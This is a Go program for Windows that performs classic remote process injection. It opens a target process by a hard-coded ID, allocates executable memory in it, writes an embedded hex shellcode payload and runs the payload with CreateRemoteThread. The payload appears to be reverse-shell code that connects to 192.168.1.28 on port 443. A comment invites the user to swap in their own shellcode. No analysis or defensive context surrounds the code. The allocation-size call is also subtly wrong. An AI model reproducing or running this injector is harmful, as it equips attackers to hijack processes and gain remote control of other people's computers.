package main

import "C"
import (
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	VirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	OpenProcess        = kernel32.MustFindProc("OpenProcess")
	WriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	VirtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
	CreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	CloseHandle        = kernel32.MustFindProc("CloseHandle")
)

func main() {
	var processHandle uintptr
	var remotethread uintptr
	var remoteBuffer uintptr
	var WriteProcess uintptr
	var ret uintptr

	//specify ID for notepad or target process
	var pid uint32 = 4440

	//insert your own shellcode here in hex
	shelly, err := hex.DecodeString("fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020001bbc0a8011c41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5")
	shell := []byte(shelly)

	processHandle, _, err = OpenProcess.Call(PROCESS_ALL_ACCESS, uintptr(int(0)), uintptr(pid))
	fmt.Printf("processHandle: %s    error: %s \n", processHandle, err)

	remoteBuffer, _, err = VirtualAllocEx.Call(processHandle, 0, unsafe.Sizeof(shell), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE)
	fmt.Printf("remoteBuffer: %s    error: %s \n", remoteBuffer, err)

	WriteProcess, _, err = WriteProcessMemory.Call(processHandle, remoteBuffer, uintptr(unsafe.Pointer(&shell[0])), uintptr(len(shell)))
	fmt.Printf("WriteProcess: %s    error: %s \n", WriteProcess, err)

	remotethread, _, err = CreateRemoteThread.Call(processHandle, uintptr(uint32(0x00)), uintptr(int(0)), remoteBuffer, uintptr(uint32(0x00)), uintptr(int(0)), uintptr(uint32(0x00)))
	fmt.Printf("remotethread: %s    error: %s \n", remotethread, err)

	ret, _, err = CloseHandle.Call(processHandle)
	fmt.Printf("processHandle: %s    error: %s \n", ret, err)
}
